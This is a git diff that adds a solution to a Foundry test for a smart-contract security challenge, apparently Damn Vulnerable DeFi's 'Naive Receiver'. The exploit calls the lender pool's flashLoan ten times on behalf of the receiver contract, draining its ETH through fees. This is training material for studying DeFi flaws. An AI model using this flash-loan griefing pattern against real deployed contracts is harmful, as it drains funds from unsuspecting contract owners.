@@ -6,6 +6,7 @@ import "forge-std/Test.sol";
 
 import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
 import {NaiveReceiverLenderPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";
+import "forge-std/console2.sol";
 
 contract NaiveReceiver is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
@@ -49,6 +50,15 @@ contract NaiveReceiver is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.prank(attacker);
+        console2.log("Receiver lender pool started with %s ETH", address(naiveReceiverLenderPool).balance / 1e18);
+        console2.log("flashLoanReceiver started with %s ETH", address(flashLoanReceiver).balance / 1e18);
+
+        for (uint8 i = 0; i < 10; i++) {
+            address(naiveReceiverLenderPool).call(abi.encodeWithSignature("flashLoan(address,uint256)", address(flashLoanReceiver), 1 ether));
+        }
+
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         validation();
